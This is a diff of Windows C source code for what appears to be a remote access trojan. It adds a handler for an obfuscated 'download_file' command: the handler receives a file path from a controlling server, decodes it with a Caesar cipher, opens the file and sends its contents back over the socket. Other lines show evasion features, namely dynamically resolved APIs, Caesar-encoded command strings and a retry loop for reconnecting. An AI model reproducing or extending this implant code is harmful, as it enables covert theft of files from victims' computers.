@@ -1,12 +1,11 @@
 #include <Windows.h>
 #include <shlobj_core.h>
 #include <wininet.h>
+#include <stdio.h>
 #include "utils.h"
 #include "config.h"
 #include "resolve_apis.h"
 #include "file_explorer.h"
-
-#define Sleep_TIME 30
 
 HANDLE g_hChildStd_IN_Rd = NULL;
 HANDLE g_hChildStd_IN_Wr = NULL;
@@ -320,7 +319,30 @@ retry:
 		}
 
 		if (Api.strncmp(server_reply, "it|sqtfidknqj", strlen("it|sqtfidknqj")) == 0) { //download_file
+			char* path = (char*)Api.malloc(MAX_PATH);
 
+			//Receive a reply from the server
+			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
+			{
+				//recv failed
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			FILE* fp = Api.fopen(CAESAR_DECRYPT(path), "rb");
+			Api.free(path);
+
+			if (fp == NULL)
+			{
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			if (download_file(fp, sock) == 0) {
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
 		}
 
 		if (Api.strncmp(server_reply, "it|sqtfidinw", strlen("it|sqtfidinw")) == 0) { //download_dir
